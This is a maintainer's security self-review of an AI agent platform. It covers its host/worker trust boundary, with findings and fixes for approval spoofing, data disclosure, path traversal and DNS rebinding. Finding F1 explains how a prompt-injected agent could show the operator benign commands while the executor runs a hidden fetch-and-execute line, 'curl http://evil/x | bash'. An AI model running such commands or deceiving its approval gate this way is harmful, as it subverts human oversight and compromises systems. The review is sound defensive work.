# Pre-Public Security Self-Review — 2026-07-04

Self-review of Compass/Latch before the repo is made public (and before sharing with a first
outside reader). Scope: the trust boundary between the **trusted host** (`server.js`, secrets in
`data/`) and the **untrusted, disposable worker** (OpenClaw + `latch-agent-bridge` +
`latch-agent-executor`, holding only the agent key). This is a maintainer self-review, not a
substitute for the external co-creator review described in [SECURITY-REVIEW.md](./SECURITY-REVIEW.md).

**Threat model reviewed against:** a compromised or prompt-injected worker. The design promise is
that such a worker still cannot reach the operator's accounts or act without operator approval,
because it never holds the credentials and the operator review is the gate. Findings below are
ranked by how much they erode that promise.

## Summary

Five findings. None is a remote-unauthenticated compromise; the core boundary (auth gate, timing-safe
key compare, operator-only approval decisions, credential isolation) holds. The two that mattered
were **confused-deputy / least-privilege** gaps against the untrusted worker (F1, F2) — both fixed in
this pass. F3 is defense-in-depth on the root executor (fixed). F4 is a documented residual. F5 was
stale documentation (fixed).

| # | Severity | Finding | Status |
|---|----------|---------|--------|
| F1 | **Medium** | Approval display vs. execution field split — worker could show benign `renderedCommands` while shipping different `executionPlan.commands` to the root executor | **Fixed** (host restart) |
| F2 | Low–Med | `/api/state` readable by the agent key → full operator console disclosure to the semi-trusted worker | **Fixed** (host restart) |
| F3 | Low | Executor `screenshot`/`download` wrote to an unconstrained `path` → root executor could write anywhere on the worker | **Fixed** (worker redeploy) |
| F4 | Low | DNS-rebinding TOCTOU in `reject_private_url` (SSRF guard resolves, then Playwright re-resolves) | Accepted residual |
| F5 | Doc | `SECURITY-REVIEW.md` said the bridge cannot send email / `external_contact` is draft-only — no longer true | **Fixed** (docs) |

---

## F1 — Approval "what runs" is shown from a different field than what executes (Medium)

**Where:** `server.js` POST `/api/approvals` (stored `renderedCommands` and `executionPlan` as two
independent worker-supplied fields); `public/app.js` `renderApprovals()` shows `renderedCommands`;
`worker/latch-agent-executor.py` `run_shell_plan()` runs `executionPlan.commands`.

**What:** The operator's "Show exact commands" view read `approval.renderedCommands`, but the root
executor runs `approval.executionPlan.commands`. Both fields arrive from the untrusted worker and the
host never checked that they agree. An honest bridge keeps them equal, but a compromised or
prompt-injected worker could submit `renderedCommands: ["echo hello"]` alongside
`executionPlan.commands: ["curl http://evil/x | bash"]`. The operator would approve after reading
`echo hello`; the executor would run the curl **as root**. This defeats the operator review, which is
the primary control in the whole design.

**Fix:** Make the executed plan the single source of truth. For shell mode the host now *derives* the
displayed commands from `executionPlan.commands` and ignores any worker-supplied `renderedCommands`
(`server.js`, `displayedCommands`). What the operator approves is exactly what the executor runs.
Regression tests added in `test/smoke.mjs` (divergent-plan case + assertion that display follows the
plan). Browser plans were already WYSIWYG (`executionPlanMarkup` renders `executionPlan.actions`).

**Applies on:** host server restart (server-side only; no worker redeploy needed).

## F2 — `/api/state` exposes the full operator console to the agent key (Low–Medium)

**Where:** `server.js` GET `/api/state` had only the global auth gate, no `requireOperator`.

**What:** Any valid key — including the agent key held on the semi-trusted worker — could read
`visibleState(db)`: all messages, tasks, approvals, executions, **all** context items (including ones
never shared with the agent, via `operatorContextItem`), users, purchases and network. This
contradicts the "worker sees only shared context" promise and hands a compromised worker the entire
console. The worker never actually needs it: it uses `/api/agent/poll` for its scoped feed (confirmed
— no worker code references `/api/state`).

**Fix:** Gated `/api/state` with `requireOperator`. Worker feed is unaffected. Regression test added
(agent key → 403).

**Applies on:** host server restart.

## F3 — Executor screenshot/download path traversal (Low, defense-in-depth)

**Where:** `worker/latch-agent-executor.py` `run_browser_plan()` — `screenshot` and `download`
actions wrote to `Path(action["path"])` with no confinement.

**What:** The executor runs as root. An approved browser plan whose `path` was rewritten or misjudged
(`../../etc/...`, or an absolute path) could write anywhere on the worker filesystem. Operator
approval gates the plan, but the operator is unlikely to scrutinize a `path` field, and the worker is
untrusted. This also contradicted the `SECURITY-REVIEW.md` checklist line "No route accepts file paths
that can escape intended storage directories."

**Fix:** Added `confine_path()` — resolves the requested path under the per-approval download dir and
rejects anything that escapes, falling back to a safe default name. Applied to both `screenshot` and
`download`.

**Applies on:** worker redeploy (`latch-agent-executor`).

## F4 — DNS-rebinding TOCTOU in the SSRF guard (Low, accepted residual)

**Where:** `worker/latch-agent-executor.py` `reject_private_url()`.

**What:** The guard resolves the hostname and rejects private/loopback/link-local/reserved IPs, then
Playwright's `page.goto` resolves the name again independently. A hostile authoritative DNS could
answer public on the check and private on the fetch, reaching an internal/metadata address. Requires
an operator-approved plan pointing at an attacker-controlled domain, so exploitability is low.

**Status:** Accepted for now. Full mitigation (pin the checked IP and force the connection to it) is
awkward with Playwright. Documented here so the external reviewer can weigh it. The guard already
checks *all* addresses `getaddrinfo` returns and covers literal IPs, so simple cases are handled.

## F5 — Stale security documentation (Doc)

**Where:** `SECURITY-REVIEW.md` said the bridge "cannot send outbound email," `external_contact`
"remains draft/manual only," and "Do not start by giving the agent a real inbox."

**What:** Host-brokered agent email now exists (`email.mjs`, `email_campaign` approvals, server-side
send in `handleApprovedApprovalSideEffects`). Credentials still live only on the host and cold contact
still requires operator approval, but the "cannot send" statements are false and would mislead a
reviewer.

**Fix:** Updated `SECURITY-REVIEW.md` with a dated superseding note describing the current
host-brokered email boundary.

---

## What held up (verified good)

- **Global auth gate:** every `/api/*` route is behind a valid-key check (401 otherwise).
- **Key comparison is timing-safe:** `safeEqual` hashes both sides with SHA-256 and uses
  `timingSafeEqual` — length-safe and no empty-token bypass.
- **Approval *decisions* are operator-only:** PATCH/DELETE `/api/approvals/:id` are `requireOperator`.
  The agent cannot approve or deny its own requests — the most important property, and it holds. The
  executor additionally only runs approvals with server-set `status === "approved"`.
- **`require*` guard pattern is consistent:** every `requireOperator`/`requireAgent` call is followed
  by `if (res.writableEnded) return;` — no missing-guard bypass.
- **Credential isolation:** the worker holds only the agent key. LLM/GitHub/mailbox/operator secrets
  stay on the host; public config endpoints redact them to booleans (`hasApiKey`, `tokenConfigured`).
  The host's LLM key never flows to the worker (the worker runs its own local Ollama).
- **SSRF guard now covers `open`, `download`, and `search_web`** (not just search), rejecting
  private/loopback/link-local/reserved targets by literal and resolved IP.
- **Email header injection is guarded:** `sanitizeHeader` strips CR/LF from all header values; the
  body is CRLF-normalized and SMTP dot-stuffed. Cold contact requires an approved outreach plan
  (`classifySend` → `needs_approval` for unknown recipients).

## Deploy checklist for these fixes

- **F1, F2** (server.js): restart the host server (`Start-Latch-Tailscale.ps1`).
- **F3** (executor): redeploy `latch-agent-executor` on the worker
  (`sudo install ... && systemctl restart latch-agent-executor`).
- Re-run `node test/smoke.mjs`, `node test/agent-email.mjs`, `node test/secret-scan.mjs` (all green
  as of this review) and, on the worker, `test/executor.py` / `test/worker-ssrf.py`.

---

## Addendum — 2026-07-05 boundary sweep

A follow-up pass enumerated every route's auth guard and each trust domain (operator, agent,
Compass-Simple user, network worker). The operator/agent split is clean — after the global auth gate
every route is `requireOperator` or `requireAgent`, except `/api/llm/chat` and `POST /api/approvals`
which are intentionally reachable by the worker. The user and network-worker feeds are scoped to the
caller's own records. One real finding:

### F6 — Unshared context metadata leaked to the worker (Low, Fixed)

**Where:** `/api/agent/poll` → `agentContextItems(activeItems(db.contextItems).slice(0, 50))`.

**What:** The item *body* was correctly gated on `shareWithAgent`, but the poll passed **all** active
context items to `agentContextItems`, so the worker received the **title, tags, category, and
filename** of context the operator never shared with it. Titles/filenames can themselves be sensitive
("Bank recovery codes", "salary.pdf"). This contradicted "the worker sees only shared context." The
network path already pre-filtered on `shareWithNetwork`; the agent path did not — an asymmetry.

**Fix:** the poll now pre-filters to `shareWithAgent` before building the agent context list, mirroring
the network path. Regression test in `test/smoke.mjs` (an unshared note must not appear in the poll at
all). Applies on host restart.

**Also reviewed, no change needed:** profile/anchor are operator-only + file-locked; approval
decisions operator-only; auto-approval is typed-only; the executor runs only approved plans as a
non-root user; `publicAuthConfig` exposes no secrets; user/network-worker feeds are per-caller scoped.
(Very-minor notes, not acted on: the network-worker token is matched by hash equality rather than
`timingSafeEqual` — acceptable since the stored value is already a hash; channel labels are returned
to signed-in users unfiltered — labels are not secrets.)
